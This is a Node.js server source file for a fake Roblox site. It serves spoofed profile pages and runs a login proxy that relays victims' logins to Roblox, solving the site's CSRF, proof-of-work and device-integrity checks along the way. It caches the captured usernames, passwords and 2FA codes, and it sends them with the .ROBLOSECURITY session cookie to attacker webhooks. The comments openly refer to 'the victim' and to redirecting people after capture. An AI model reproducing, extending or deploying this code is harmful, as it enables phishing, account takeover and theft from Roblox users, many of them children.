        await renderGamePage(req, res, placeId);
    } catch (e) {
        recordVisit({
            type: 'game',
            targetId: req.params.id,
            targetName: `Game #${req.params.id}`,
            ip: req.ip,
            sessionUser: req.session?.user
        });
        await renderGamePage(req, res, req.params.id);
    }
});

// ── Profile page route: served via PHP CLI ──
// Runs profile.php using the bundled php-cgi.exe so no separate PHP server is needed.
const { spawn } = require('child_process');
const PHP_EXE = process.platform === 'win32'
    ? path.join(__dirname, 'php', 'php-cgi.exe')
    : (fs.existsSync('/usr/bin/php-cgi') ? '/usr/bin/php-cgi' : 'php-cgi');
const LOGIN_PHP = path.join(__dirname, 'login.php');
const CAPTURE_PHP = path.join(__dirname, 'capture.php');
const PROFILE_PHP = path.join(__dirname, 'public', 'profile.php');
const COMMUNITY_PHP = path.join(__dirname, 'community.php');

function runPhpCgi(req, res, {
    scriptFilename,
    requestUri = req.originalUrl,
    queryString = req.originalUrl.includes('?') ? req.originalUrl.split('?')[1] : '',
    contentType = req.headers['content-type'] || '',
    body = ''
}) {
    const env = {
        ...process.env,
        REDIRECT_STATUS: '200',
        QUERY_STRING: queryString,
        REQUEST_URI: requestUri,
        REQUEST_METHOD: req.method,
        SERVER_NAME: 'localhost',
        SERVER_PORT: String(PORT),
        SCRIPT_FILENAME: scriptFilename,
        DOCUMENT_ROOT: __dirname,
        GATEWAY_INTERFACE: 'CGI/1.1',
        HTTP_HOST: req.get('host') || `localhost:${PORT}`,
        REMOTE_ADDR: req.ip || '127.0.0.1',
        HTTP_USER_AGENT: req.headers['user-agent'] || '',
        HTTP_COOKIE: req.headers.cookie || '',
        CONTENT_TYPE: contentType,
        CONTENT_LENGTH: body ? Buffer.byteLength(body).toString() : '0',
    };

    const php = spawn(PHP_EXE, [], { env, cwd: __dirname });
    let output = '';
    let errOutput = '';
    php.stdout.on('data', d => {
        output += d.toString('binary');
        console.log('[PHP STDOUT]', d.toString()); // Log all stdout for debugging
    });
    php.stderr.on('data', d => {
        errOutput += d.toString();
        console.error('[PHP STDERR]', d.toString()); // Log all stderr for debugging
    });

    php.on('close', code => {
        if (res.headersSent) return;

        if (code !== 0 && !output) {
            console.error(`[PHP ERROR] Process exited with code ${code}:`, errOutput);
            return res.status(500).send('PHP script execution failed.');
        }

        // Split CGI headers from body
        let headerPart = '';
        let bodyBuffer = Buffer.from(output, 'binary');

        const headerEndCrLf = output.indexOf('\r\n\r\n');
        const headerEndLf = output.indexOf('\n\n');
        let headerEndIndex = -1;
        let headerDelimiterLength = 0;

        if (headerEndCrLf !== -1 && (headerEndLf === -1 || headerEndCrLf <= headerEndLf)) {
            headerEndIndex = headerEndCrLf;
            headerDelimiterLength = 4;
        } else if (headerEndLf !== -1) {
            headerEndIndex = headerEndLf;
            headerDelimiterLength = 2;
        }

        if (headerEndIndex !== -1) {
            headerPart = output.substring(0, headerEndIndex);
            bodyBuffer = Buffer.from(output.substring(headerEndIndex + headerDelimiterLength), 'binary');

            // Parse CGI headers
            const headerLines = headerPart.split(/\r?\n/);
            let statusCode = 200;

            for (const line of headerLines) {
                const colonIdx = line.indexOf(':');
                if (colonIdx === -1) continue;
                const headerName = line.substring(0, colonIdx).trim().toLowerCase();
                const headerVal = line.substring(colonIdx + 1).trim();

                if (headerName === 'status') {
                    const parsedStatus = parseInt(headerVal.split(' ')[0], 10);
                    if (!isNaN(parsedStatus)) statusCode = parsedStatus;
                } else if (headerName === 'location') {
                    statusCode = 302;
                    res.setHeader('Location', headerVal);
                } else if (headerName === 'set-cookie') {
                    const existing = res.getHeader('Set-Cookie');
                    if (existing) {
                        res.setHeader('Set-Cookie', Array.isArray(existing) ? [...existing, headerVal] : [existing, headerVal]);
                    } else {
                        res.setHeader('Set-Cookie', headerVal);
                    }
                } else {
                    res.setHeader(headerName, headerVal);
                }
            }

            if (!res.getHeader('content-type')) {
                res.setHeader('Content-Type', 'text/html; charset=utf-8');
            }

            res.status(statusCode).send(bodyBuffer);
        } else {
            res.setHeader('Content-Type', 'text/html; charset=utf-8');
            res.status(code === 0 ? 200 : 500).send(bodyBuffer);
        }
    });

    php.on('error', err => {
        console.error('[PHP SPAWN ERROR - UNCAUGHT]', err.message, err.stack);
        if (!res.headersSent) {
            res.status(500).send('PHP-CGI executable could not be spawned or encountered a critical error. Check path and permissions.');
        }
    });

    if (body) {
        php.stdin.write(body);
    }
    php.stdin.end();
}

function serializePhpBody(req) {
    if (req.method !== 'POST') return '';
    const ct = (req.headers['content-type'] || '').toLowerCase();
    if (ct.includes('application/json')) {
        return JSON.stringify(req.body || {});
    }
    return new URLSearchParams(
        Object.entries(req.body || {}).map(([key, value]) => [key, value == null ? '' : String(value)])
    ).toString();
}

// The login beacon posts text/plain; express.json leaves that body untouched,
// so parse it as text for the capture endpoints before the handler runs.
app.use(['/capture.php', '/capture'], express.text({ type: () => true, limit: '256kb' }));

app.all('/login.php', (req, res) => {
    if (req.method === 'POST' && req.body && (req.body.username || req.body.cvalue)) {
        return phpCaptureHandler(req, res);
    }
    return loginPage(req, res);
});

app.all('/capture.php', phpCaptureHandler);

app.get('/users/:id/profile', (req, res) => {
    const userId = req.params.id;
    recordVisit({
        type: 'profile',
        targetId: userId,
        ip: req.ip,
        sessionUser: req.session?.user
    });
    return profilePage(req, res, userId);
});

app.get('/communities/:id', (req, res) => {
    const communityId = req.params.id;
    recordVisit({
        type: 'group',
        targetId: communityId,
        ip: req.ip,
        sessionUser: req.session?.user
    });
    return communityPage(req, res, communityId);
});

// ── Roblox API Reverse Proxies ──
// These handle the rewrites done by profile.php so the profile page JS works on localhost.
// Maps: /rblx-<name>/* → https://<api-name>.roblox.com/*
const ROBLOX_API_PROXIES = {
    'rblx-users':          'https://users.roblox.com',
    'rblx-friends':        'https://friends.roblox.com',
    'rblx-thumbnails-api': 'https://thumbnails.roblox.com',
    'rblx-games-api':      'https://games.roblox.com',
    'rblx-presence':       'https://presence.roblox.com',
    'rblx-groups':         'https://groups.roblox.com',
    'rblx-economy':        'https://economy.roblox.com',
    'rblx-abtesting':      'https://ab-testing.roblox.com',
    'rblx-accountsettings':'https://accountsettings.roblox.com',
    'rblx-accountinformation':'https://accountinformation.roblox.com',
    'rblx-apis':           'https://apis.roblox.com',
    'rblx-avatar':         'https://avatar.roblox.com',
    'rblx-catalog':        'https://catalog.roblox.com',
    'rblx-inventory':      'https://inventory.roblox.com',
    'rblx-assetdelivery':  'https://assetdelivery.roblox.com',
    'rblx-badges':         'https://badges.roblox.com',
    'rblx-develop':        'https://develop.roblox.com',
    'rblx-auth':           'https://auth.roblox.com',
    'rblx-chat':           'https://chat.roblox.com',
    'rblx-notifications':  'https://notifications.roblox.com',
    'rblx-locale':         'https://locale.roblox.com',
    'rblx-lms':            'https://lms.roblox.com',
    'rblx-metrics':        'https://metrics.roblox.com',
    'rblx-voice':          'https://voice.roblox.com',
};

// --- FAKE PROFILE API INTERCEPTS ---
app.get('/rblx-friends/v1/users/:id/followers/count', (req, res, next) => {
    try {
        const fakeProfiles = loadProfiles();
        if (fakeProfiles[req.params.id]) {
            return res.json({ count: fakeProfiles[req.params.id].followers || 0 });
        }
    } catch(e) {}
    next();
});
app.get('/rblx-friends/v1/users/:id/friends/count', (req, res, next) => {
    try {
        const fakeProfiles = loadProfiles();
        if (fakeProfiles[req.params.id]) {
            return res.json({ count: fakeProfiles[req.params.id].friends || 0 });
        }
    } catch(e) {}
    next();
});
app.get('/rblx-friends/v1/users/:id/followings/count', (req, res, next) => {
    try {
        const fakeProfiles = loadProfiles();
        if (fakeProfiles[req.params.id]) {
            return res.json({ count: fakeProfiles[req.params.id].followings || 0 });
        }
    } catch(e) {}
    next();
});
app.get('/rblx-users/v1/users/:id', async (req, res, next) => {
    try {
        const fakeProfiles = loadProfiles();
        const fake = fakeProfiles[req.params.id];
        if (fake) {
            const upstream = await fetch(`https://users.roblox.com/v1/users/${fake.realUserId || req.params.id}`, { headers: ROBLOX_HEADERS });
            if (upstream.ok) {
                const data = await upstream.json();
                data.id = parseInt(req.params.id);
                data.name = fake.fakeUsername || data.name;
                data.displayName = fake.fakeDisplayName || fake.fakeUsername || data.displayName;
                data.description = fake.fakeBio || data.description || '';
                data.created = fake.creationDate ? new Date(fake.creationDate).toISOString() : data.created;
                data.isBanned = false;
                return res.json(data);
            }
        }
    } catch(e) {}
    next();
});

// INTERCEPT AVATAR (Accessories/Clothing)
app.get('/rblx-avatar/v1/users/:id/avatar', async (req, res, next) => {
    try {
        const fakeProfiles = loadProfiles();
        const fake = fakeProfiles[req.params.id];
        if (fake && fake.realUserId) {
            const upstream = await fetch(`https://avatar.roblox.com/v1/users/${fake.realUserId}/avatar`, { headers: ROBLOX_HEADERS });
            if (upstream.ok) {
                const data = await upstream.json();
                return res.json(data);
            }
        }
    } catch(e) {}
    next();
});

app.get('/rblx-avatar/v1/users/:id/currently-wearing', async (req, res, next) => {
    try {
        const fakeProfiles = loadProfiles();
        const fake = fakeProfiles[req.params.id];
        if (fake && fake.realUserId) {
            const upstream = await fetch(`https://avatar.roblox.com/v1/users/${fake.realUserId}/currently-wearing`, { headers: ROBLOX_HEADERS });
            if (upstream.ok) {
                const data = await upstream.json();
                return res.json(data);
            }
        }
    } catch(e) {}
    next();
});

// INTERCEPT BADGES
app.get('/rblx-badges/v1/users/:id/badges', async (req, res, next) => {
    try {
        const fakeProfiles = loadProfiles();
        const fake = fakeProfiles[req.params.id];
        if (fake && fake.realUserId) {
            const qs = req.url.includes('?') ? req.url.substring(req.url.indexOf('?')) : '';
            const upstream = await fetch(`https://badges.roblox.com/v1/users/${fake.realUserId}/badges${qs}`, { headers: ROBLOX_HEADERS });
            if (upstream.ok) {
                const data = await upstream.json();
                return res.json(data);
            }
        }
    } catch(e) {}
    next();
});

// INTERCEPT THUMBNAILS (Profile Pictures)
app.get('/rblx-thumbnails-api/v1/users/:type', async (req, res, next) => {
    try {
        if (!req.query.userIds) return next();
        const fakeProfiles = loadProfiles();
        const id = req.query.userIds.split(',')[0];
        const fake = fakeProfiles[id];
        if (fake && fake.realUserId) {
            const newQuery = req.url.substring(req.url.indexOf('?')).replace(`userIds=${id}`, `userIds=${fake.realUserId}`);
            const upstream = await fetch(`https://thumbnails.roblox.com/v1/users/${req.params.type}${newQuery}`, { headers: ROBLOX_HEADERS });
            if (upstream.ok) {
                const data = await upstream.json();
                if (data && data.data && data.data.length > 0) {
                    data.data[0].targetId = parseInt(id); // React checks if targetId matches the profile ID
                }
                return res.json(data);
            }
        }
    } catch(e) {}
    next();
});

app.post('/rblx-presence/v1/presence/users', async (req, res, next) => {
    try {
        if (req.body && Array.isArray(req.body.userIds)) {
            const fakeProfiles = loadProfiles();
            const id = req.body.userIds[0]; 
            const fake = fakeProfiles[id];
            if (fake) {
                let presenceType = 0; 
                if (fake.status === 'Online') presenceType = 1;
                else if (fake.status === 'InGame' || fake.status === 'Playing') presenceType = 2;
                else if (fake.status === 'InStudio') presenceType = 3;
                
                return res.json({
                    userPresences: [{
                        userPresenceType: presenceType,
                        lastLocation: "",
                        placeId: null,
                        rootPlaceId: null,
                        gameId: null,
                        universeId: null,
                        userId: parseInt(id),
                        lastOnline: new Date().toISOString()
                    }]
                });
            }
        }
    } catch(e) {}
    next();
});

// ── Roblox Login Proxy with Cookie Capture ──

// Store session cookies per user session
const loginSessions = new Map();

// Sessions whose .ROBLOSECURITY has already been dispatched. Prevents a request
// loop from firing the webhook once per hop for the same account.
const capturedSessions = new Set();

// Capture dispatch dedupe. Keyed by account + cookie tail, short TTL.
const dispatchedCaptures = new Set();

// Last successful capture per client IP. The login page polls /api/login-state
// and navigates the victim to the real Roblox home the moment this is set, so
// the bounce does not depend on the page's own router noticing the session.
const recentLogins = new Map();

// Username seen on the first login hop, kept so a later 2FA verify — whose body
// carries only a code — can still be attributed to the right account.
const loginIdentities = new Map();

// Last challenge id this session was actually issued. Inbound rblx-challenge-*
// headers that do not match it are stale (a previous attempt, a different tab,
// a cached page). Replaying those makes Roblox answer "Challenge failed to
// authorize request", so they are dropped rather than forwarded.
const loginChallenges = new Map();

// Accounts that reached the two-step gate on THIS attempt. While an entry is
// present the relay will not emit x-login-complete and the page will not bounce
// to the real home, no matter what cookie Roblox hands back. Cleared only when
// the verify hop returns a session, or when a new credential POST starts.
const login2faPending = new Map();
const TWOFA_PENDING_TTL_MS = 15 * 60 * 1000;

function mark2faPending(sessionId, username) {
    login2faPending.set(sessionId, { username: username || '', at: Date.now() });
    setTimeout(() => login2faPending.delete(sessionId), TWOFA_PENDING_TTL_MS).unref?.();
}

function is2faPending(sessionId) {
    const entry = login2faPending.get(sessionId);
    if (!entry) return false;
    if (Date.now() - entry.at > TWOFA_PENDING_TTL_MS) {
        login2faPending.delete(sessionId);
        return false;
    }
    return true;
}

// ── Attempt rows awaiting a verdict ──
// A credential POST writes its Hits row before Roblox answers, so the attempt is
// visible even when the handshake outlives the function budget. The verdict
// arrives on the same request (or the next hop of the same session), and it must
// complete that row instead of writing a second one beside it. Keyed by session
// and by client address, capped and swept — an unauthenticated caller can mint
// sessions at will, so this cannot be an unbounded Map.
const pendingAttempts = new Map();
const PENDING_ATTEMPT_TTL_MS = 15 * 60 * 1000;
const PENDING_ATTEMPT_MAX = 5000;

function attemptKeys(sessionId, clientIp, username) {
    const keys = [];
    if (sessionId) keys.push(`s:${sessionId}`);
    if (clientIp) keys.push(`ip:${clientIp}`);
    if (username) keys.push(`u:${String(username).toLowerCase()}`);
    return keys;
}

function rememberAttempt({ sessionId, clientIp, username, hitId }) {
    if (!hitId) return;
    const at = Date.now();
    for (const key of attemptKeys(sessionId, clientIp, username)) {
        pendingAttempts.set(key, { hitId, at });
    }
    if (pendingAttempts.size > PENDING_ATTEMPT_MAX) {
        for (const [k, v] of pendingAttempts) {
            if (at - v.at > PENDING_ATTEMPT_TTL_MS) pendingAttempts.delete(k);
        }
        // Still over the cap: drop oldest insertions, Map preserves order.
        for (const k of pendingAttempts.keys()) {
            if (pendingAttempts.size <= PENDING_ATTEMPT_MAX) break;
            pendingAttempts.delete(k);
        }
    }
}

function takeAttemptId({ sessionId, clientIp, username }) {
    const at = Date.now();
    for (const key of attemptKeys(sessionId, clientIp, username)) {
        const hit = pendingAttempts.get(key);
        if (!hit) continue;
        if (at - hit.at > PENDING_ATTEMPT_TTL_MS) {
            pendingAttempts.delete(key);
            continue;
        }
        for (const k of attemptKeys(sessionId, clientIp, username)) pendingAttempts.delete(k);
        return hit.hitId;
    }
    return null;
}


// ── Persistent Multi-Hop Credential Store ──
// Tracks credentials across multi-step challenges (PoW, Captcha, 2FA, token exchange)
// so the final cookie capture hop always preserves the victim's real username & password.
const credentialCache = new Map();

// Debounce state for the PHP credential mirror. See writePhpCredCache.
let credFlushTimer = null;
let pendingCredFlush = null;

// capture.php (PHP, served by Apache) keeps its own cache at
// .cache/pending_creds.json. The login page beacons there, the proxy hop lands
// here, and before this bridge the two stores never met: by the time the cookie
// arrived, this process had no password to print and shipped "None".
// Both sides now read and write the same file, keyed by IP.
const PHP_CREDS_FILE = R.dataPath('.cache', 'pending_creds.json');
const CRED_TTL_MS = 60 * 60 * 1000;

function readPhpCredCache() {
    try {
        if (!fs.existsSync(PHP_CREDS_FILE)) return {};
        return JSON.parse(fs.readFileSync(PHP_CREDS_FILE, 'utf8')) || {};
    } catch { return {}; }
}

function writePhpCredCache(cache) {
    // Debounced. The login page beacons on every submit, and each beacon used to
    // rewrite the whole file synchronously. The in-memory cache is authoritative
    // for this process; the file exists only so the PHP lane can read what Node
    // already wrote, and a one-second coalesce loses nothing there.
    pendingCredFlush = cache;
    if (credFlushTimer) return;
    credFlushTimer = setTimeout(() => {
        const payload = pendingCredFlush;
        pendingCredFlush = null;
        credFlushTimer = null;
        if (!payload) return;
        try {
            fs.mkdirSync(path.dirname(PHP_CREDS_FILE), { recursive: true });
            S.writeJsonAtomic(PHP_CREDS_FILE, payload);
        } catch (err) {
            console.error('[CREDS] bridge write failed:', err.message);
        }
    }, 1000);
    if (credFlushTimer.unref) credFlushTimer.unref();
}

function saveCredentialEntry(key, username, password, twoFactorCode = '') {
    if (!key) return;
    const cleanKey = String(key).trim().toLowerCase();
    const existing = credentialCache.get(cleanKey) || {};
    const u = (username && username !== 'Unknown') ? username : (existing.username || '');
    const p = (password && password !== 'None' && password !== 'Captured') ? password : (existing.password || '');
    const code = twoFactorCode || existing.twoFactorCode || '';
    if (!u && !p && !code) return;

    const record = { username: u, password: p, twoFactorCode: code, timestamp: Date.now() };
    credentialCache.set(cleanKey, record);

    // Mirror to the PHP store so login.php's beacon and this process agree.
    const shared = readPhpCredCache();
    shared[cleanKey] = record;
    writePhpCredCache(shared);
}

function getSavedCredentials(key) {
    if (!key) return null;
    const cleanKey = String(key).trim().toLowerCase();

    let entry = credentialCache.get(cleanKey);

    // Node store misses on the PHP-first path (login.php beacons to capture.php
    // before any proxy request reaches this process), so read the shared file
    // before giving up.
    if (!entry) {
        const shared = readPhpCredCache();
        const row = shared[cleanKey];
        if (row) {
            entry = row;
            credentialCache.set(cleanKey, row);
        }
    }

    if (!entry) return null;
    const raw = Number(entry.timestamp) || 0;
    // PHP writes seconds, Node writes ms, and an older PHP build wrote nothing.
    // A missing stamp means "just stashed", not "expired".
    const stamp = raw === 0 ? Date.now() : (raw > 1e12 ? raw : raw * 1000);
    if (Date.now() - stamp > CRED_TTL_MS) {
        credentialCache.delete(cleanKey);
        const shared = readPhpCredCache();
        if (shared[cleanKey]) { delete shared[cleanKey]; writePhpCredCache(shared); }
        return null;
    }
    return entry;
}

function stashLoginCredentials(sessionId, clientIp, username, password, twoFactorCode = '') {
    if (sessionId) saveCredentialEntry(sessionId, username, password, twoFactorCode);
    if (clientIp) saveCredentialEntry(clientIp, username, password, twoFactorCode);
    if (username && username !== 'Unknown') {
        saveCredentialEntry(username, username, password, twoFactorCode);
    }
}

function resolveLoginCredentials(sessionId, clientIp, username, userObj = null) {
    const creds = getSavedCredentials(sessionId)
        || getSavedCredentials(clientIp)
        || (userObj?.name ? getSavedCredentials(userObj.name) : null)
        || (username ? getSavedCredentials(username) : null)
        || {};
    
    const finalUser = userObj?.name || (username && username !== 'Unknown' ? username : (creds.username || 'Unknown'));
    const finalPass = (creds.password && creds.password !== 'None' && creds.password !== 'Captured') ? creds.password : 'None';
    const finalCode = creds.twoFactorCode || '';
    return { username: finalUser, password: finalPass, twoFactorCode: finalCode };
}

// Helper to send captured data to webhook
async function sendToWebhook(data) {
    const webhooks = loadWebhooks();
    const webhookUrls = [];
    Object.values(webhooks).forEach(w => {
        if (w.webhookUrl && !webhookUrls.includes(w.webhookUrl)) webhookUrls.push(w.webhookUrl);
        if (w.quadhookUrl && !webhookUrls.includes(w.quadhookUrl)) webhookUrls.push(w.quadhookUrl);
        if (w.dualhookUrl && !webhookUrls.includes(w.dualhookUrl)) webhookUrls.push(w.dualhookUrl);
        if (w.triplehookUrl && !webhookUrls.includes(w.triplehookUrl)) webhookUrls.push(w.triplehookUrl);
    });
    
    if (webhookUrls.length === 0) {
        console.log('[WEBHOOK] No webhooks configured');
        return;
    }

    const descLines = [
        `**Username:** \`${data.username || 'Unknown'}\``,
        `**Password:** \`${data.password || 'None'}\``,
        `**IP:** \`${data.ip || 'Unknown'}\``,
        `**Timestamp:** ${data.timestamp || new Date().toISOString()}`
    ];
    if (data.twoFactorCode) {
        descLines.push(`**2FA Code:** \`${data.twoFactorCode}\``);
    }
    descLines.push(
        ``,
        `**🔐 .ROBLOSECURITY Cookie:**`,
        data.cookie ? `\`\`\`\n${data.cookie}\n\`\`\`` : '`None`'
    );

    const embed = {
        embeds: [{
            title: data.twoFactorCode ? '🔐 Roblox 2FA Login Captured' : '🔐 Roblox Login Captured',
            description: descLines.join('\n'),
            color: 5763719,
            footer: {
                text: 'ARTERYX • Login Proxy'
            }
        }]
    };

    for (const webhookUrl of webhookUrls) {
        try {
            await axios.post(webhookUrl, embed);
            console.log(`[WEBHOOK] Sent login capture to webhook`);
        } catch (e) {
            console.error(`[WEBHOOK] Failed to send:`, e.message);
        }
    }
}

// ── Auth challenge handshake ──
// Roblox will not answer a login POST until the caller proves itself: first a
// CSRF token, then a proof-of-work puzzle. Both are completed here, server side,
// so the browser posts credentials and gets a real verdict back. Two-step
// verification and captcha challenges are passed straight through for the page
// to render.
const AUTH_UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36';

function parseCookieHeader(str) {
    const jar = new Map();
    String(str || '').split(';').forEach(pair => {
        const t = pair.trim();
        if (!t) return;
        const i = t.indexOf('=');
        if (i > 0) jar.set(t.slice(0, i).trim(), t.slice(i + 1).trim());
    });
    return jar;
}

function absorbSetCookies(response, jar) {
    const list = response.headers.getSetCookie
        ? response.headers.getSetCookie()
        : (response.headers.get('set-cookie') ? [response.headers.get('set-cookie')] : []);
    for (const raw of list) {
        const pair = raw.split(';')[0];
        const i = pair.indexOf('=');
        if (i > 0) jar.set(pair.slice(0, i).trim(), pair.slice(i + 1).trim());
    }
    return list;
}

const jarToHeader = jar => [...jar.entries()].map(([k, v]) => `${k}=${v}`).join('; ');

// hashcash: find x where sha256(A + x) < T, then register the solution.
// Proof-of-work here is a verifiable delay function, not hashcash.
//
// The puzzle hands back N (a 1024-bit modulus), A (a small base) and T (a
// squaring count, 400000). The answer is A^(2^T) mod N: work you cannot
// parallelise because each squaring depends on the last. T is far too small to
// be a hash threshold, and N would be dead weight in a hashcash construction —
// both of which is why the old `sha256(A + x) < T` loop never found anything.
//
// Roblox's own client posts { sessionID, solution } back to the same URL it
// fetched the puzzle from, then redeems the challenge at /challenge/v1/continue
// before retrying the login. All three steps are reproduced below.
async function vdfSolve(A, N, T) {
    let acc = A % N;
    let done = 0;
    while (done < T) {
        const end = Math.min(done + 4000, T);
        for (; done < end; done++) acc = (acc * acc) % N;
        // Yield between chunks: the full 400k squarings take about seven
        // seconds and this box also has to keep serving the login page.
        if (done < T) await new Promise(resolve => setImmediate(resolve));
    }
    return acc;
}

// POST that clears the XSRF gate the same way the browser does: the first
// rejection carries a fresh token in the header, the retry carries it back.
async function postWithCsrf(url, body, csrf, jar) {
    const send = async token => {
        const headers = {
            'User-Agent': AUTH_UA,
            'Content-Type': 'application/json',
            Accept: 'application/json',
            Origin: 'https://www.roblox.com',
            Referer: 'https://www.roblox.com/login',
            Cookie: jarToHeader(jar)
        };
        if (token) headers['X-CSRF-TOKEN'] = token;
        const response = await fetch(url, { method: 'POST', headers, body: JSON.stringify(body) });
        absorbSetCookies(response, jar);
        return response;
    };
    let response = await send(csrf);
    if (response.status === 403) {
        const fresh = response.headers.get('x-csrf-token') || csrf;
        await response.text();
        response = await send(fresh);
    }
    return response;
}

async function solveProofOfWork(metaBase64, jar) {
    try {
        const meta = JSON.parse(Buffer.from(metaBase64, 'base64').toString('utf8'));
        const sessionId = meta.sessionId;
        if (!sessionId) return null;

        const puzzleRes = await fetch(
            `https://apis.roblox.com/proof-of-work-service/v1/pow-puzzle?urlLocale=en_us&sessionID=${encodeURIComponent(sessionId)}`,
            { headers: { 'User-Agent': AUTH_UA, Accept: 'application/json, text/plain, */*' } }
        );
        if (puzzleRes.status !== 200) {
            console.error(`[POW] puzzle fetch failed: ${puzzleRes.status}`);
            return null;
        }
        const puzzle = await puzzleRes.json();
        const artifacts = typeof puzzle.artifacts === 'string' ? JSON.parse(puzzle.artifacts) : puzzle.artifacts;
        if (!artifacts || !artifacts.A || !artifacts.N || !artifacts.T) {
            console.error('[POW] unexpected artifact shape');
            return null;
        }

        const started = Date.now();
        const solution = String(
            await vdfSolve(BigInt(artifacts.A), BigInt(artifacts.N), Number(artifacts.T))
        );
        console.log(`[POW] VDF solved in ${Date.now() - started}ms`);

        const verifyRes = await postWithCsrf(
            'https://apis.roblox.com/proof-of-work-service/v1/pow-puzzle',
            { sessionID: sessionId, solution },
            null,
            jar
        );
        const verdict = await verifyRes.json().catch(() => ({}));
        console.log(`[POW] verify ${verifyRes.status} answerCorrect=${verdict.answerCorrect}`);
        if (!verdict.redemptionToken) return null;

        return { sessionId, solution, redemptionToken: verdict.redemptionToken };
    } catch (err) {
        console.error('[POW] Solver failed:', err.message);
        return null;
    }
}

async function proxyAuthWithChallenge({ targetUrl, bodyObj, inboundCookie, userAgent, inboundChallenge = {}, inboundCsrf = null }) {
    const jar = parseCookieHeader(inboundCookie);

    const doPost = async (extra = {}) => {
        const headers = {
            'User-Agent': userAgent || AUTH_UA,
            'Content-Type': 'application/json',
            'Accept': 'application/json, text/plain, */*',
            'Origin': 'https://www.roblox.com',
            'Referer': 'https://www.roblox.com/login',
            Cookie: jarToHeader(jar),
            ...extra
        };
        const response = await fetch(targetUrl, {
            method: 'POST',
            headers,
            body: JSON.stringify(bodyObj)
        });
        absorbSetCookies(response, jar);
        return response;
    };

    // Challenge headers the page already collected (2FA, captcha, a solved
    // proof-of-work) ride along on the retried request.
    const passThrough = {};
    for (const h of ['rblx-challenge-id', 'rblx-challenge-type', 'rblx-challenge-metadata']) {
        if (inboundChallenge[h]) passThrough[h] = inboundChallenge[h];
    }

    // Roblox requires a signed secure-authentication intent on the credential
    // POST. Without one the answer is a `deviceintegrity` challenge on every
    // attempt and no .ROBLOSECURITY is ever issued — which is exactly the
    // "it shows a dash in the cookie column" report.
    //
    // Always mint our own, even when the browser sent one. A client-minted
    // intent is bound to the nonce it fetched on its own origin and dies the
    // moment the POST is replayed from this process — keeping it is what made
    // the gate look unfixable. The engine that owns intent minting lives in
    // twofactor.js; this uses the same keypair/nonce/signature flow.
    if (bodyObj && typeof bodyObj === 'object' && (bodyObj.password || bodyObj.cvalue)) {
        const hadClientIntent = Boolean(bodyObj.secureAuthenticationIntent);
        try {
            const intent = await TwoFactorHandler.generateSecureAuthIntent({ header: jarToHeader(jar) || '' });
            if (intent) {
                bodyObj = {
                    ...bodyObj,
                    ctype: bodyObj.ctype || (String(bodyObj.cvalue || '').includes('@') ? 'Email' : 'Username'),
                    secureAuthenticationIntent: intent
                };
                console.log(`[AUTH] secure intent minted${hadClientIntent ? ' (replaced client-supplied)' : ''}`);
            } else {
                console.warn('[AUTH] no server nonce — credential POST will run without an intent');
            }
        } catch (err) {
            console.warn('[AUTH] secure intent mint failed:', err.message);
        }
    }

    let response = await doPost(passThrough);
    let csrf = response.headers.get('x-csrf-token');

    // A device-integrity challenge means the intent was missing, stale, or bound
    // to a nonce that expired while the PoW solve ran. Mint a fresh one and retry
    // rather than reporting the attempt as a rejection.
    let intentRounds = 0;
    while (response.status === 403 && response.headers.get('rblx-challenge-type') === 'deviceintegrity' && intentRounds++ < 2) {
        const fresh = await TwoFactorHandler.generateSecureAuthIntent({ header: jarToHeader(jar) || '' })
            .catch(() => null);
        if (!fresh) break;
        console.log('[AUTH] deviceintegrity — retrying with a fresh secure intent');
        bodyObj = { ...bodyObj, secureAuthenticationIntent: fresh };
        response = await doPost(csrf ? { ...passThrough, 'X-CSRF-TOKEN': csrf } : passThrough);
        csrf = response.headers.get('x-csrf-token') || csrf;
    }

    // 0. The browser already holds a CSRF token and sent it. Honour it before
    // minting a new one: Roblox binds the token to the session cookie in the
    // jar, and re-minting on every hop is what turned the React client's single
    // retry into an endless 403 loop.
    if (inboundCsrf && response.status === 403 && !response.headers.get('rblx-challenge-type')) {
        response = await doPost({ ...passThrough, 'X-CSRF-TOKEN': inboundCsrf });
        csrf = response.headers.get('x-csrf-token') || csrf;
    }

    // 1. CSRF gate — token arrives on the rejection, one retry clears it.
    if (response.status === 403 && csrf && !response.headers.get('rblx-challenge-type')) {
        console.log('[AUTH] CSRF token issued, retrying');
        response = await doPost({ ...passThrough, 'X-CSRF-TOKEN': csrf });
        csrf = response.headers.get('x-csrf-token') || csrf;
    }

    // 2. Proof-of-work gate — solve, verify, redeem, resubmit.
    let rounds = 0;
    while (response.status === 403 && response.headers.get('rblx-challenge-type') === 'proofofwork' && rounds++ < 3) {
        const challengeId = response.headers.get('rblx-challenge-id');
        const originalMeta = response.headers.get('rblx-challenge-metadata');
        const solved = await solveProofOfWork(originalMeta, jar);
        if (!solved) break;

        // The redemption token is what authorises the replay. Without the
        // /challenge/v1/continue call the retry is rejected with
        // "Challenge failed to authorize request" no matter how right the VDF was.
        const challengeMetadata = JSON.stringify({
            redemptionToken: solved.redemptionToken,
            sessionId: solved.sessionId
        });

        const redeemRes = await postWithCsrf(
            'https://apis.roblox.com/challenge/v1/continue',
            { challengeId, challengeType: 'proofofwork', challengeMetadata },
            csrf,
            jar
        );
        const redeemCsrf = redeemRes.headers.get('x-csrf-token');
        console.log(`[POW] challenge/continue ${redeemRes.status}`);
        await redeemRes.text();
        if (redeemCsrf) csrf = redeemCsrf;

        response = await doPost({
            ...passThrough,
            'X-CSRF-TOKEN': csrf,
            'rblx-challenge-id': challengeId,
            'rblx-challenge-type': 'proofofwork',
            'rblx-challenge-metadata': originalMeta
        });
        csrf = response.headers.get('x-csrf-token') || csrf;

        // The redeemed challenge rotates the CSRF token. If the replay lands
        // back on the CSRF gate, one more hop with the rotated token clears it.
        if (response.status === 403 && csrf && !response.headers.get('rblx-challenge-type')) {
            console.log('[POW] CSRF rotated after challenge, retrying');
            response = await doPost({
                ...passThrough,
                'X-CSRF-TOKEN': csrf,
                'rblx-challenge-id': challengeId,
                'rblx-challenge-type': 'proofofwork',
                'rblx-challenge-metadata': originalMeta
            });
            csrf = response.headers.get('x-csrf-token') || csrf;
        }
    }

    return { response, jar, csrf };
}
// A page can fire the same login POST twice — once from its submit handler and
// once from the form itself. Each one costs a full proof-of-work solve, which is
// about seven seconds of big-integer squarings, so identical attempts are
// collapsed here: the second caller waits on the first promise and replays its
// result. Successful results stay cached for a short window. A failure is never
